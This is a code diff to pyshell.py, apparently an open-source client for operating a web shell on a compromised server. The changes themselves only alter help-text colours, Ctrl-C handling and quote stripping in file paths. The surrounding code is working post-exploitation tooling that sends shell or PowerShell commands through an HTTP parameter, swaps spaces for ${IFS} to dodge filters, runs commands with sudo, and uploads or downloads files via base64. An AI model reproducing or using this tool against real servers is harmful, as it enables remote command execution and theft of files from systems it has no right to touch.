@@ -83,17 +83,17 @@ def send_command(command, webshell, method, param="code"):
     return response.content.decode(errors="ignore")
 
 def show_help():
-    print(colored("[!] Usage: pyshell.py <URL> <METHOD> [OPTIONS]\n", "red"))
+    print(colored("[!] Usage: pyshell.py <OPTIONS> <URL> <METHOD>\n", "red"))
     print(colored("OPTIONS:", "yellow"))
-    print(colored("  -a <auth>        Authorization header", "blue"))
-    print(colored("  -c <cookies>     Cookie header", "blue"))
-    print(colored("  -p <param>       Parameter name (default: code)", "blue"))
-    print(colored("  -ne              Disable URL encoding on key chars", "blue"))
-    print(colored("  -np              Disable HTML <pre> tags parser", "blue"))
-    print(colored("  -pi              Pipe all commands after parameter", "blue"))
-    print(colored("  -ifs             Replace spaces with IFS", "blue"))
-    print(colored("  -su              Sudo command execution (Linux only)", "blue"))
-    print(colored("  -ps              PowerShell execution (Windows only)", "blue"))
+    print(colored("  -a <auth>        Authorization header", "white"))
+    print(colored("  -c <cookies>     Cookie header", "white"))
+    print(colored("  -p <param>       Parameter name (default: code)", "white"))
+    print(colored("  -ne              Disable URL encoding on key chars", "white"))
+    print(colored("  -np              Disable HTML <pre> tags parser", "white"))
+    print(colored("  -pi              Pipe all commands after parameter", "white"))
+    print(colored("  -ifs             Replace spaces with IFS", "white"))
+    print(colored("  -su              Sudo command execution (Linux only)", "white"))
+    print(colored("  -ps              PowerShell execution (Windows only)", "white"))
     print()
 
 if __name__ == "__main__":
@@ -225,7 +225,11 @@ if __name__ == "__main__":
                 else:
                     cinput += (colored(" ", "blue", "on_yellow")) ; cinput += (colored(path.rstrip() + " ", "grey", "on_yellow"))
                 cinput += (colored(" ", "yellow"))
-                command = input(cinput + "\001\033[0m\002")
+                try:
+                    command = input(cinput + "\001\033[0m\002")
+                except KeyboardInterrupt:
+                    print(colored("\n[!] Exiting..\n", "red"))
+                    break
                 
                 if IFS:
                     command = command.replace(" ","${IFS}")
@@ -341,7 +345,7 @@ if __name__ == "__main__":
                             if len(command.split()) < 2:
                                 print(colored("[!] Usage: import-ps1 \"/path/script.ps1\"\n", "red"))
                             else:
-                                localfile = command.split()[1].replace('"','')
+                                localfile = command.split()[1].replace('"','').replace("'","")
                                 if not localslash in localfile:
                                     cwd = os.getcwd()
                                     localfile = cwd + localslash + localfile
@@ -356,6 +360,8 @@ if __name__ == "__main__":
                                         print(colored(f"[!] Error executing script: {result}\n", "red"))
                                     else:
                                         print(colored(f"[+] File {filename} imported successfully!\n", "green"))      
+                                except KeyboardInterrupt:
+                                    print("\n")
                                 except FileNotFoundError:
                                     print(colored(f"[!] Error: file {localfile} not found!\n", "red"))
                                 except Exception as e:
@@ -378,8 +384,8 @@ if __name__ == "__main__":
                         if len(command.split()) == 1 or len(command.split()) == 2:
                             print(colored("[!] Usage: upload local_file.ext remote_file.ext\n", "red"))
                         else:
-                            localfile = command.split()[1]
-                            remotefile = command.split()[2]
+                            localfile = command.split()[1].replace('"','').replace("'","")
+                            remotefile = command.split()[2].replace('"','').replace("'","")
                             if remotefile == ".":
                                 remotefile = command.split()[1]
                             if not slash in remotefile:
@@ -396,6 +402,9 @@ if __name__ == "__main__":
                                 print(colored("[+] Uploading file " + localfile + " on " + remotefile + "..\n", "green"))
                             try:
                                 f = open(localfile, "rb") ; rawfiledata = f.read() ; base64data = base64.b64encode(rawfiledata)
+                            except KeyboardInterrupt:
+                                print("\n")
+                                continue
                             except OSError:
                                 print(colored("[!] Local file " + localfile + " does not exist!\n", "red"))
                                 continue
@@ -418,8 +427,8 @@ if __name__ == "__main__":
                             if len(command.split()) == 1 or len(command.split()) == 2:
                                 print(colored("[!] Usage: download remote_file.ext local_file.ext\n", "red"))
                             else:
-                                remotefile = command.split()[1]
-                                localfile = command.split()[2]
+                                remotefile = command.split()[1].replace('"','').replace("'","")
+                                localfile = command.split()[2].replace('"','').replace("'","")
                                 if not slash in remotefile:
                                     remotefile = path.rstrip() + slash + command.split()[1]
                                 if not localslash in localfile:
@@ -430,11 +439,16 @@ if __name__ == "__main__":
                                     print(colored("[+] Downloading file " + remotefile + " on " + cwd + localslash + localfile + "..\n", "green"))
                                 else:
                                     print(colored("[+] Downloading file " + remotefile + " on " + localfile + "..\n", "green"))
-                                if system == "linux":
-                                    base64data = send_command(PIPE + "base64" + space + remotefile, WEBSHELL, HTTP_METHOD, PARAM) 
-                                if system == "windows":
-                                    command = "[Convert]::ToBase64String([IO.File]::ReadAllBytes('"+remotefile+"'))" 
-                                    base64data = send_command(PIPE + command, WEBSHELL, HTTP_METHOD, PARAM)
+                                try:
+                                    if system == "linux":
+                                        base64data = send_command(PIPE + "base64" + space + remotefile, WEBSHELL, HTTP_METHOD, PARAM) 
+                                    if system == "windows":
+                                        command = "[Convert]::ToBase64String([IO.File]::ReadAllBytes('"+remotefile+"'))" 
+                                        base64data = send_command(PIPE + command, WEBSHELL, HTTP_METHOD, PARAM)
+                                except KeyboardInterrupt:
+                                    print("\n")
+                                    continue
+                                
                                 if NOPRE:
                                     base64data = "<pre>" + base64data + "</pre>"
                                 if "<pre>" in base64data:
@@ -562,8 +576,8 @@ if __name__ == "__main__":
                                                     print(colored(content, "white")) 
 
             except KeyboardInterrupt:
-                print(colored("\n[!] Exiting..\n", "red"))
-                break
+                print("\n")
+                continue
 
             except:
                 pass
